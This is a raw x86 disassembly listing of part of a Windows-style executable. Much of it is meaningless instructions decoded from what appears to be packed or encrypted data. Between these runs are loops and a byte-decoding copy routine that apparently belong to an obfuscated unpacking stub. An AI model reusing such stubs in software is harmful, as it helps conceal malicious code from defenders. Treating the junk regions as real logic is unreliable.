  40f0c3:	or     eax,0x9094c9a3
  40f0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0c9:	xlat   BYTE PTR ds:[ebx]
  40f0ca:	rcl    BYTE PTR [ecx+eiz*1-0x3b634d12],0x18
  40f0d2:	mov    eax,0x194ecd37
  40f0d7:	dec    esi
  40f0d8:	xor    ebx,edi
  40f0da:	inc    edi
  40f0db:	and    DWORD PTR [eax],edx
  40f0dd:	mov    cs,edi
  40f0df:	test   eax,0x3b95c68b
  40f0e4:	aaa    
  40f0e5:	sub    bh,BYTE PTR [eax-0x68]
  40f0e8:	int    0x51
  40f0ea:	mov    ss,ebp
  40f0ec:	frstor [ebp-0xb]
  40f0ef:	dec    edi
  40f0f0:	jne    0x40f0f5
  40f0f2:	jnp    0x40f129
  40f0f4:	jne    0x40f161
  40f0f6:	push   edx
  40f0f7:	loop   0x40f0cd
  40f0f9:	out    dx,al
  40f0fa:	pop    ecx
  40f0fb:	jns    0x40f0e9
  40f0fd:	mov    ds:0x3b0f6340,eax
  40f102:	inc    ebx
  40f103:	hlt    
  40f104:	push   edx
  40f105:	je     0x40f0e3
  40f107:	push   edi
  40f108:	pop    edx
  40f109:	mov    ecx,0xc29de140
  40f10e:	fcomp  QWORD PTR [eax+0x49aff765]
  40f114:	sbb    DWORD PTR [ebp-0x4e],edx
  40f117:	add    eax,0x9cb381be
  40f11c:	cdq    
  40f11d:	adc    edi,ebp
  40f11f:	mov    al,ds:0x43a4b082
  40f124:	cdq    
  40f125:	daa    
  40f126:	pop    ss
  40f127:	daa    
  40f128:	mov    ecx,0x531e208f
  40f12d:	inc    esi
  40f12e:	jmp    0x40f136
  40f130:	lods   eax,DWORD PTR ds:[esi]
  40f131:	mov    eax,es:0xfe4ee0a8
  40f137:	push   ecx
  40f138:	pop    ebp
  40f139:	out    0x2b,eax
  40f13b:	xchg   ecx,eax
  40f13c:	pop    ds
  40f13d:	mov    ah,0xbc
  40f13f:	test   al,0x4
  40f141:	rcl    BYTE PTR [ecx+0x51f83315],cl
  40f147:	ja     0x40f189
  40f149:	imul   ecx,DWORD PTR [ebp+0x5cd994f5],0x48c1ab2c
  40f153:	call   0x63ef:0x990f8c54
  40f15a:	aad    0x20
  40f15c:	mov    BYTE PTR [edx+ecx*8+0x71e57d14],bl
  40f163:	adc    eax,ebx
  40f165:	xor    eax,0xaa31be85
  40f16a:	add    esi,DWORD PTR [edx+eax*1-0x31]
  40f16e:	out    0xb1,eax
  40f170:	dec    esp
  40f171:	shr    DWORD PTR [ecx+eax*2-0x27fea33e],1
  40f178:	dec    ebp
  40f179:	xchg   esp,eax
  40f17a:	sub    al,0x7b
  40f17c:	out    0x0,eax
  40f17e:	dec    esi
  40f17f:	retf   0x2d8a
  40f182:	(bad)  
  40f183:	ds loop 0x40f1dd
  40f186:	push   edi
  40f187:	jnp    0x40f14f
  40f189:	in     eax,dx
  40f18a:	mov    dl,0x79
  40f18c:	dec    ecx
  40f18d:	popf   
  40f18e:	dec    eax
  40f18f:	mov    ebx,0xcc38179c
  40f194:	xchg   ebx,eax
  40f195:	jmp    0x40f153
  40f197:	and    al,0x9b
  40f199:	mov    ds:0xd15352fb,al
  40f19e:	test   DWORD PTR [edx+eiz*2],edx
  40f1a1:	fisttp QWORD PTR fs:[edx+edx*8-0x1cd4ec08]
  40f1a9:	mov    ds:0x42eed793,al
  40f1ae:	stos   DWORD PTR es:[edi],eax
  40f1af:	aam    0x85
  40f1b1:	adc    DWORD PTR [edx+0x391a37e9],eax
  40f1b7:	jb     0x40f198
  40f1b9:	imul   edx,DWORD PTR [ebx+0x4bfc4bc3],0x7e
  40f1c0:	mov    BYTE PTR [ebx-0x78f49710],ch
  40f1c6:	adc    eax,DWORD PTR [edi+0x4502b10b]
  40f1cc:	pop    esp
  40f1cd:	xchg   esp,eax
  40f1ce:	and    al,0xd3
  40f1d0:	adc    eax,0xef09b4b8
  40f1d5:	jl     0x40f1a1
  40f1d7:	and    BYTE PTR [eax],bh
  40f1d9:	xchg   edi,eax
  40f1da:	call   0x27ee:0x1df38d0e
  40f1e1:	push   esp
  40f1e2:	mov    eax,ds:0xb1ba8602
  40f1e7:	adc    esi,ecx
  40f1e9:	jp     0x40f218
  40f1eb:	push   ds
  40f1ec:	dec    esp
  40f1ed:	sub    BYTE PTR [eax+0x4a],bl
  40f1f0:	inc    edx
  40f1f1:	xchg   edi,eax
  40f1f2:	mov    ah,0x14
  40f1f4:	cmp    DWORD PTR [esi-0xd],0xeb1a88e6
  40f1fb:	mov    ebx,0x8f845af2
  40f200:	mov    ebp,0xb8ef494a
  40f205:	push   eax
  40f206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f207:	push   es
  40f208:	mov    WORD PTR [esi+0xe277287],cs
  40f20e:	loope  0x40f22b
  40f210:	push   0x2ccf7962
  40f215:	out    dx,eax
  40f216:	outs   dx,BYTE PTR ds:[esi]
  40f217:	sbb    DWORD PTR [eax-0x54],esp
  40f21a:	inc    ecx
  40f21b:	mov    bl,0x15
  40f21d:	jg     0x40f24c
  40f21f:	dec    esp
  40f220:	xor    ecx,eax
  40f222:	and    ch,BYTE PTR [eax-0x6a4f7cd9]
  40f228:	xchg   esp,eax
  40f229:	jg     0x40f1e5
  40f22b:	pop    ebx
  40f22c:	adc    dl,BYTE PTR [ebx]
  40f22e:	cmp    edi,DWORD PTR [eax+0x2]
  40f231:	xchg   bl,bh
  40f233:	push   esi
  40f234:	leave  
  40f235:	imul   edi,DWORD PTR [eax+0x5d0430c6],0xc257d19d
  40f23f:	pop    eax
  40f240:	jecxz  0x40f1fe
  40f242:	cmp    al,0xc1
  40f244:	or     cl,dh
  40f246:	sub    al,0x93
  40f248:	inc    ebx
  40f249:	mov    ch,0x57
  40f24b:	cs push esi
  40f24d:	mov    ah,0x33
  40f24f:	pop    eax
  40f250:	ds and eax,0x96de3eab
  40f256:	cmp    eax,0x3af88
  40f25b:	sti    
  40f25c:	push   edi
  40f25d:	inc    esp
  40f25e:	add    al,BYTE PTR [ebp-0x5accf72b]
  40f264:	sbb    dh,BYTE PTR [esi-0x79]
  40f267:	pushf  
  40f268:	ret    0x1e9a
  40f26b:	mov    es,WORD PTR [esi]
  40f26d:	push   cs
  40f26e:	sub    eax,0xb9cae4aa
  40f273:	or     eax,0x326d7b55
  40f278:	jle    0x40f237
  40f27a:	mov    al,0x2f
  40f27c:	mov    cl,0xe
  40f27e:	sbb    DWORD PTR [ebp-0xac785],ebp
  40f284:	mov    ebx,0x64828e69
  40f289:	mov    BYTE PTR [esi+0x2d],cl
  40f28c:	mov    bh,BYTE PTR [ecx]
  40f28e:	dec    esp
  40f28f:	adc    al,0xd0
  40f291:	mov    ah,ah
  40f293:	das    
  40f294:	mov    ecx,0xc65b33b0
  40f299:	push   ebp
  40f29a:	aam    0xeb
  40f29c:	push   ebx
  40f29d:	sub    eax,0x2e069730
  40f2a2:	inc    esp
  40f2a3:	out    dx,eax
  40f2a4:	lahf   
  40f2a5:	jg     0x40f2cf
  40f2a7:	rcr    DWORD PTR [esi],cl
  40f2a9:	sbb    eax,0x8cef95c
  40f2ae:	cmp    ebx,esp
  40f2b0:	add    eax,0x6ee7085c
  40f2b5:	sbb    bl,BYTE PTR [ecx]
  40f2b7:	add    ebx,DWORD PTR [ebp-0x5d]
  40f2ba:	popa   
  40f2bb:	add    eax,0x4710527b
  40f2c0:	or     eax,0x24ab36f5
  40f2c5:	arpl   sp,ax
  40f2c7:	adc    al,0x68
  40f2c9:	jge    0x40f282
  40f2cb:	jp     0x40f255
  40f2cd:	lds    eax,FWORD PTR [eax+eiz*2-0x5d]
  40f2d1:	fisubr WORD PTR [eax]
  40f2d3:	sub    esi,edi
  40f2d5:	icebp  
  40f2d6:	ds shl ah,0x82
  40f2da:	popf   
  40f2db:	fisttp WORD PTR [ebp+0x6a]
  40f2de:	jno    0x40f2bf
  40f2e0:	xchg   edi,eax
  40f2e1:	inc    eax
  40f2e2:	xlat   BYTE PTR ds:[ebx]
  40f2e3:	and    bh,BYTE PTR [esi-0x65]
  40f2e6:	sbb    ch,BYTE PTR [esi]
  40f2e8:	sub    eax,0xa2830f54
  40f2ed:	retf   0x99f5
  40f2f0:	xchg   ebp,eax
  40f2f1:	jecxz  0x40f30e
  40f2f3:	scas   eax,DWORD PTR es:[edi]
  40f2f4:	cmp    DWORD PTR [eax-0x1129dd85],ebx
  40f2fa:	mov    al,0x1a
  40f2fc:	sbb    cl,cl
  40f2fe:	std    
  40f2ff:	test   eax,0x155e681a
  40f304:	xor    bl,al
  40f306:	and    DWORD PTR [ebx-0x54],ecx
  40f309:	out    0x49,al
  40f30b:	dec    edi
  40f30c:	push   DWORD PTR [edi-0x76]
  40f30f:	(bad)  
  40f310:	rol    esp,1
  40f312:	out    0xaa,al
  40f314:	add    edi,ebp
  40f316:	jg     0x40f38b
  40f318:	pop    ebx
  40f319:	(bad)
  40f31c:	sbb    BYTE PTR [edx],0xd6
  40f31f:	mov    ebp,0xca418a00
  40f324:	inc    edx
  40f325:	repnz (bad) 
  40f327:	cmp    al,0x7c
  40f329:	cld    
  40f32a:	fimul  DWORD PTR [ecx+0x64]
  40f32d:	ror    BYTE PTR [eax],cl
  40f32f:	sub    al,0x30
  40f331:	cli    
  40f332:	xor    al,0xa
  40f334:	xor    dl,BYTE PTR [edi-0x35]
  40f337:	pmulhw mm5,mm4
  40f33a:	cmp    cl,dl
  40f33c:	leave  
  40f33d:	sub    ah,bl
  40f33f:	jo     0x40f3b9
  40f341:	push   eax
  40f342:	fwait
  40f343:	repz jg 0x40f2e0
  40f346:	enter  0xa662,0x7d
  40f34a:	mov    dl,BYTE PTR [ebx+0x7f]
  40f34d:	adc    DWORD PTR ds:0xfe420015,esp
  40f353:	sbb    DWORD PTR [ecx-0xf],0xc89900c9
  40f35a:	icebp  
  40f35b:	test   al,0xd4
  40f35d:	dec    ebx
  40f35e:	sub    DWORD PTR [ecx],esp
  40f360:	mov    edi,0x4c7aa11b
  40f365:	sti    
  40f366:	xor    dh,BYTE PTR [edx-0x53]
  40f369:	and    dh,BYTE PTR cs:[eax-0x259e6139]
  40f370:	jb     0x40f38e
  40f372:	sub    dl,ch
  40f374:	and    bl,dh
  40f376:	mov    edi,0x4beac4bf
  40f37b:	cmp    al,0x7f
  40f37d:	and    BYTE PTR [eax-0x24],al
  40f380:	jg     0x40f36e
  40f382:	mov    eax,0xf89c8531
  40f387:	and    DWORD PTR ds:0x433727,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433727
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433727,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433727,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433727,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433727
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433727,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433727,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43362b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433703
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433657,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433657,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433657,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433657
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433657,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4336ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4336ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4336ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4336ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4336ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4336ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4336db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4336db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4336db,edx
  40f498:	cmp    DWORD PTR ds:0x4336db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433891
  40f4af:	push   0x4338e7
  40f4b4:	push   0x4338cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4336db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433717
  40f4d2:	adc    DWORD PTR ds:0x433727,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x6757e3c7]
  40f540:	jecxz  0x40f516
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	mov    WORD PTR [ebp-0x38bb8b12],gs
  40f54f:	push   edx
  40f550:	clc    
  40f551:	adc    edx,DWORD PTR [esi+0x72]
  40f554:	(bad)  
  40f555:	loopne 0x40f5c4
  40f557:	dec    ecx
  40f558:	fisttp WORD PTR ds:0xc8a3227
  40f55e:	jb     0x40f570
  40f560:	test   al,0x12
  40f562:	outs   dx,DWORD PTR ds:[esi]
  40f563:	jge    0x40f4f9
  40f565:	dec    ebp
  40f566:	mov    ecx,0x9b3432a4
  40f56b:	jl     0x40f55f
  40f56d:	pop    ebx
  40f56e:	or     al,0xf4
  40f570:	xchg   ebx,eax
  40f571:	mov    ecx,0x6bcfb477
  40f576:	mov    eax,ds:0xe8b55a46
  40f57b:	xlat   BYTE PTR ds:[ebx]
  40f57c:	stos   DWORD PTR es:[edi],eax
  40f57d:	jle    0x40f5df
  40f57f:	add    al,0xc7
  40f581:	scas   eax,DWORD PTR es:[edi]
  40f582:	shl    DWORD PTR [ebp+0x121e3257],0x55
  40f589:	(bad)  
  40f58a:	cmp    bl,ch
  40f58c:	in     eax,dx
  40f58d:	inc    DWORD PTR [edx]
  40f58f:	into   
  40f590:	jnp    0x40f565
  40f592:	outs   dx,BYTE PTR ds:[esi]
  40f593:	lock fld QWORD PTR [ecx+ebp*2]
  40f597:	outs   dx,BYTE PTR ds:[esi]
  40f598:	pushf  
  40f599:	pop    ebx
  40f59a:	and    al,0xe7
  40f59c:	shr    DWORD PTR [eax+0x6b],1
  40f59f:	nop
  40f5a0:	call   0xa691ebe6
  40f5a5:	adc    DWORD PTR [ecx+0xad6f479],esi
  40f5ab:	pop    esp
  40f5ac:	inc    esi
  40f5ad:	jecxz  0x40f5e5
  40f5af:	repnz push 0xbc7ed60
  40f5b5:	mov    eax,ds:0xc39ff142
  40f5ba:	ffreep st(0)
  40f5bc:	mov    ds:0x3f616551,al
  40f5c1:	lods   eax,DWORD PTR ds:[esi]
  40f5c2:	lods   eax,DWORD PTR ds:[esi]
  40f5c3:	(bad)  
  40f5c4:	jbe    0x40f634
  40f5c6:	in     eax,0xa7
  40f5c8:	xchg   edx,eax
  40f5c9:	jg     0x40f5fa
  40f5cb:	add    DWORD PTR [esi+ebx*4],esi
  40f5ce:	cmp    al,0x7
  40f5d0:	enter  0x375c,0x22
  40f5d4:	pop    edi
  40f5d5:	push   cs
  40f5d6:	pop    ebx
  40f5d7:	test   BYTE PTR [ebx+esi*2+0x25],dl
  40f5db:	push   ds
  40f5dc:	sub    ecx,DWORD PTR ds:0x67382277
  40f5e2:	loop   0x40f572
  40f5e4:	cmp    dl,bh
  40f5e6:	fldpi  
  40f5e8:	mov    DWORD PTR [ecx],ebp
  40f5ea:	js     0x40f5d5
  40f5ec:	sub    eax,0xec97d69f
  40f5f1:	jl     0x40f598
  40f5f3:	cdq    
  40f5f4:	int3   
  40f5f5:	aam    0x1b
  40f5f7:	xchg   ebx,eax
  40f5f8:	inc    edx
  40f5f9:	xchg   edi,eax
  40f5fa:	fcom   DWORD PTR [eax+0x3e]
  40f5fd:	je     0x40f676
  40f5ff:	shr    dl,cl
  40f601:	xor    ebx,ebx
  40f603:	push   cs
  40f604:	xchg   esp,eax
  40f605:	sbb    DWORD PTR ds:0x996ef0f5,0xffffffa6
  40f60c:	lds    ebx,FWORD PTR [ecx+edx*8-0x3e]
  40f610:	(bad)  
  40f611:	jg     0x40f600
  40f613:	icebp  
  40f614:	ret    0x4ad4
  40f617:	sub    dl,ch
  40f619:	pop    eax
  40f61a:	stc    
  40f61b:	(bad)  
  40f61c:	jnp    0x40f5b5
  40f61e:	mov    al,ds:0xfb109444
  40f623:	push   esp
  40f624:	mov    bl,0xe4
  40f626:	leave  
  40f627:	sbb    al,0x1a
  40f629:	push   edx
  40f62a:	data16 sbb bl,BYTE PTR [esi]
  40f62d:	or     BYTE PTR [eax*4-0x5e4d7a5],ah
  40f634:	fsubr  DWORD PTR [ebp+0x7a319efe]
  40f63a:	fst    QWORD PTR [eax+0x65c07592]
  40f640:	rol    DWORD PTR [ebx],0xae
  40f643:	scas   al,BYTE PTR es:[edi]
  40f644:	mov    ah,0xfd
  40f646:	gs xchg ebp,eax
  40f648:	clc    
  40f649:	or     al,0x2d
  40f64b:	leave  
  40f64c:	mov    DWORD PTR [ebp-0xb],edx
  40f64f:	stos   WORD PTR es:[edi],ax
  40f651:	hlt    
  40f652:	jle    0x40f620
  40f654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f655:	jge    0x40f66b
  40f657:	cs retf 0x2de2
  40f65b:	pop    esi
  40f65c:	or     cl,BYTE PTR [ecx-0x2]
  40f65f:	mov    edx,0x2848d471
  40f664:	out    dx,eax
  40f665:	xlat   BYTE PTR ds:[ebx]
  40f666:	ss out dx,al
  40f668:	xor    DWORD PTR [edx+0x79735f71],edi
  40f66e:	dec    eax
  40f66f:	lds    esi,FWORD PTR [eax-0x7ae0243]
  40f675:	(bad)  
  40f676:	mov    cl,BYTE PTR [esi-0x503eb1df]
  40f67c:	shl    DWORD PTR [ebx+edi*1+0x61690cd0],cl
  40f683:	jns    0x40f606
  40f685:	push   es
  40f686:	(bad)
  40f689:	pop    ebx
  40f68a:	fldcw  WORD PTR [edi+edi*4-0x69]
  40f68e:	jno    0x40f634
  40f690:	sar    al,0x1d
  40f693:	fstp   QWORD PTR [esi-0x235dd90c]
  40f699:	jge    0x40f6ca
  40f69b:	cs or  eax,0x4f25f6eb
  40f6a1:	das    
  40f6a2:	cli    
  40f6a3:	adc    al,0x9c
  40f6a5:	fmul   QWORD PTR ds:0xc9e057c0
  40f6ab:	push   ss
  40f6ac:	nop
  40f6ad:	jmp    0xcc2dfe01
  40f6b2:	adc    bh,al
  40f6b4:	mov    dl,0x68
  40f6b6:	sub    eax,DWORD PTR [esi+0x447f86ba]
  40f6bc:	cmp    ebp,DWORD PTR [ebp-0x55]
  40f6bf:	push   edx
  40f6c0:	fdivr  QWORD PTR [eax+esi*1+0x62b9782a]
  40f6c7:	sar    BYTE PTR [eax],cl
  40f6c9:	inc    edx
  40f6ca:	arpl   WORD PTR [esi-0x3e],dx
  40f6cd:	repz xchg ebx,eax
  40f6cf:	jp     0x40f69f
  40f6d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6d2:	repnz fs scas eax,DWORD PTR es:[edi]
  40f6d5:	ror    DWORD PTR [ebx+0x6cba1e6b],1
  40f6db:	test   BYTE PTR [esi-0x7df514f0],cl
  40f6e1:	jge    0x40f708
  40f6e3:	out    0x3d,al
  40f6e5:	cmp    cl,BYTE PTR [eax+0x56]
  40f6e8:	inc    ebp
  40f6e9:	arpl   WORD PTR [eax+0x1ea111b0],di
  40f6ef:	stc    
  40f6f0:	add    eax,0x4469aaed
  40f6f5:	pushfw 
  40f6f7:	aas    
  40f6f8:	out    0x32,eax
  40f6fa:	inc    esi
  40f6fb:	sbb    DWORD PTR [edi],edi
  40f6fd:	into   
  40f6fe:	xchg   ebp,edx
  40f700:	pushf  
  40f701:	addr16 lahf 
  40f703:	mov    edi,0x264241d5
  40f708:	jo     0x40f756
  40f70a:	xlat   BYTE PTR ds:[ebx]
  40f70b:	sbb    eax,0xe2c9fcca
  40f710:	add    DWORD PTR [ebx+ecx*8-0x5c92759b],0x58aca83f
  40f71b:	cmp    DWORD PTR [ecx+0x4daad04e],edi
  40f721:	sub    bl,BYTE PTR [ecx]
  40f723:	and    ch,BYTE PTR [ecx-0x4fb506d8]
  40f729:	pop    ds
  40f72a:	fwait
  40f72b:	and    ebp,DWORD PTR [edx]
  40f72d:	int3   
  40f72e:	xor    esp,ebx
  40f730:	xor    ecx,DWORD PTR [eax+edi*2]
  40f733:	fldenv [ebx+0x6]
  40f736:	inc    ebx
  40f737:	or     al,0x4f
  40f739:	mov    ebp,0x27736ae0
  40f73e:	xor    BYTE PTR [ebp-0x70f04351],al
  40f744:	std    
  40f745:	xor    BYTE PTR [esi],al
  40f747:	scas   al,BYTE PTR es:[edi]
  40f748:	add    ecx,DWORD PTR [esp+ecx*2-0x7c]
  40f74c:	xor    edx,ebx
  40f74e:	inc    esp
  40f74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f750:	mov    cl,0x92
  40f752:	dec    edx
  40f753:	(bad)
  40f756:	inc    ecx
  40f757:	adc    BYTE PTR [edx-0x65],ah
  40f75a:	pop    es
  40f75b:	or     bl,BYTE PTR [ebx+eiz*8+0x1f915f95]
  40f762:	retf   0xc0d0
  40f765:	clc    
  40f766:	popa   
  40f767:	mov    ebx,esi
  40f769:	and    DWORD PTR [ebx+0x55c09573],0xffffffe0
  40f770:	test   eax,0xf4d81175
  40f775:	fnstcw WORD PTR [edi+ecx*4+0x200bebf1]
  40f77c:	and    al,0xad
  40f77e:	lds    ecx,FWORD PTR [edx+0x6f]
  40f781:	cld    
  40f782:	push   ebx
  40f783:	je     0x40f74e
  40f785:	sbb    al,0xf
  40f787:	or     al,0x82
  40f789:	fisub  DWORD PTR [esi+0xc8c1481]
  40f78f:	adc    DWORD PTR [edi-0x15],edi
  40f792:	ss jge 0x40f77b
  40f795:	jbe    0x40f78c
  40f797:	stos   BYTE PTR es:[edi],al
  40f798:	iret   
  40f799:	mov    ah,0x8c
  40f79b:	into   
  40f79c:	into   
  40f79d:	dec    edx
  40f79e:	mov    esp,es
  40f7a0:	rcr    ebx,1
  40f7a2:	retf   
  40f7a3:	bound  esp,QWORD PTR [esi-0x3dde976a]
  40f7a9:	iret   
  40f7aa:	xor    bh,cl
  40f7ac:	cld    
  40f7ad:	lea    edi,[edx]
  40f7af:	and    al,0xe7
  40f7b1:	push   esi
  40f7b2:	dec    ecx
  40f7b3:	jnp    0x40f834
  40f7b5:	xor    eax,0x1c59dd18
  40f7ba:	addr16 push cs
  40f7bc:	cwde   
  40f7bd:	cmp    ah,BYTE PTR [edi+0x19]
  40f7c0:	out    0xdd,eax
  40f7c2:	fld    TBYTE PTR [edi]
  40f7c4:	jae    0x40f7dc
  40f7c6:	ins    BYTE PTR es:[edi],dx
  40f7c7:	pop    es
  40f7c8:	inc    ebx
  40f7c9:	icebp  
  40f7ca:	jl     0x40f785
  40f7cc:	xchg   ebp,eax
  40f7cd:	iret   
  40f7ce:	outs   dx,DWORD PTR ds:[esi]
  40f7cf:	pop    edi
  40f7d0:	inc    esp
  40f7d1:	ret    0xa04c
  40f7d4:	or     ecx,DWORD PTR [edi+0x6dbcda71]
  40f7da:	je     0x40f7b6
  40f7dc:	mov    ecx,0x9a768527
  40f7e1:	data16 mov dh,0x2d
  40f7e4:	cmp    BYTE PTR [esi-0x49],al
  40f7e7:	mov    esp,0xaa9ba327
  40f7ec:	(bad)  
  40f7ed:	xlat   BYTE PTR ds:[ebx]
  40f7ee:	out    dx,al
  40f7ef:	mov    bl,0xd5
  40f7f1:	loope  0x40f857
  40f7f3:	imul   esp,ecx,0x8
  40f7f6:	inc    ebx
  40f7f7:	jl     0x40f788
  40f7f9:	xor    esi,DWORD PTR [ecx+0x33]
  40f7fc:	xor    ebx,DWORD PTR [edx+0x446efae8]
  40f802:	in     al,0x9f
  40f804:	loopne 0x40f849
  40f806:	mov    ds:0xb0eba062,eax
  40f80b:	jnp    0x40f85a
  40f80d:	lds    edi,FWORD PTR [esi-0x2f]
  40f810:	lds    ecx,FWORD PTR fs:[edi-0x2ecd9018]
  40f817:	xchg   esp,eax
  40f818:	mov    dl,0x35
  40f81a:	not    BYTE PTR [edi+edi*4+0x0]
  40f81e:	jne    0x40f84a
  40f820:	shl    DWORD PTR [ecx+0x4d719730],0x73
  40f827:	jl     0x40f856
  40f829:	cmp    edx,eax
  40f82b:	jmp    DWORD PTR [ecx-0x18120dd0]
  40f831:	mov    eax,ds:0x51d9c5d
  40f836:	sbb    BYTE PTR [ebp-0x45f1f15c],dh
  40f83c:	jnp    0x40f7e3
  40f83e:	inc    esp
  40f83f:	test   eax,0xf5ac5fd1
  40f844:	sub    ecx,DWORD PTR [esi-0x76]
  40f847:	pop    eax
  40f848:	sbb    edi,DWORD PTR [edi-0x1]
  40f84b:	xor    edi,ecx
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x71526a3f
  40f897:	arpl   dx,dx
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8a1:	xchg   ebx,eax
  40f8a2:	(bad)  
  40f8a3:	xchg   ebx,eax
  40f8a4:	mov    dl,0xdb
  40f8a6:	fisttp DWORD PTR [ebx-0x77ac1ea0]
  40f8ac:	stos   DWORD PTR es:[edi],eax
  40f8ad:	arpl   WORD PTR [edx],bp
  40f8af:	jmp    FWORD PTR [eax]
  40f8b1:	add    eax,0xe6e9f3bf
  40f8b6:	(bad)  
  40f8b7:	push   0xf7c28c2c
  40f8bc:	jo     0x40f896
  40f8be:	retf   0xb219
  40f8c1:	xor    edx,DWORD PTR [edi-0xb]
  40f8c4:	in     eax,dx
  40f8c5:	repz adc BYTE PTR [edx+edx*1-0x1],dh
  40f8ca:	ja     0x40f84c
  40f8cc:	jnp    0x40f8d8
  40f8ce:	imul   edi,DWORD PTR [ecx],0xffffffd2
  40f8d1:	mov    ebx,0xd4971e7b
  40f8d6:	mov    edi,0x8b812d8
  40f8db:	xchg   esi,eax
  40f8dc:	push   0xffffffe1
  40f8de:	and    ecx,DWORD PTR [ebx-0x65081fa5]
  40f8e4:	pushf  
  40f8e5:	fist   WORD PTR [ebp-0x8075451]
  40f8eb:	outs   dx,DWORD PTR ds:[esi]
  40f8ec:	push   es
  40f8ed:	outs   dx,DWORD PTR ds:[esi]
  40f8ee:	xor    bh,BYTE PTR [ebx+0x138b1481]
  40f8f4:	sub    eax,0x40ec8e5c
  40f8f9:	(bad)  
